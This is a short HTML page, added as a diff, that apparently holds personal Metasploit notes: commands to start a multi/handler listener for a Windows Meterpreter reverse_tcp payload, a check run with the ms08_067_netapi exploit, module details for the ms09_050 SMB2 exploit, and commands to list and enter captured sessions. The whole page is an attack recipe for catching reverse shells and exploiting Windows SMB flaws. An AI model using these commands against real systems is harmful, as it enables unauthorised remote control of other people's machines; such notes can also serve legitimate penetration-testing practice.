@@ -1,0 +1,32 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>multihandler</title>
+</head><body>use exploit/multi/handler<br/>
+set LHOST tap0<br/>
+set LHOST tap0<br/>
+set LPORT SPECIFIEDPORT<br/>
+set payload windows/meterpreter/reverse_tcp<br/>
+exploit -j<br/>
+<br/>
+<br/>
+﻿msf exploit(<span style="color: #ff0000">ms08_067_netapi</span>) &gt; <span style="color: #13c16a">show options</span>&nbsp; <br/>
+﻿msf exploit(<span style="color: #ff0000">ms08_067_netapi</span>) &gt; <span style="color: #13c16a">check</span>&nbsp;<br/>
+[*] Verifying vulnerable status... (path: 0x0000005a) <br/>
+[*] System is not vulnerable (status: 0x00000000) <br/>
+[*] The target is not exploitable.<br/>
+<br/>
+<br/>
+﻿msf exploit(<span style="color: #ff0000">ms09_050_smb2_negotiate_func_index</span>) &gt; <span style="color: #13c16a">info exploit/windows/smb/ms09_050_smb2_negotiate_func_index</span>&nbsp;<br/>
+Name: Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference <br/>
+Module: exploit/windows/smb/ms09_050_smb2_negotiate_func_index <br/>
+Version: 14774 Platform: Windows <br/>
+Privileged: Yes<br/>
+License: Metasploit Framework License (BSD) <br/>
+Rank: Good &nbsp; <br/>
+<br/>
+﻿msf &gt; <span style="color: #13c16a">sessions -h</span>&nbsp; &nbsp;<br/>
+﻿﻿msf exploit(<span style="color: #ff0000">3proxy</span>) &gt; <span style="color: #13c16a">sessions -l</span>&nbsp; &nbsp;<br/>
+<span style="color: #13c16a">sessions -i 1</span>&nbsp; &nbsp;<br/>
+</body></html>
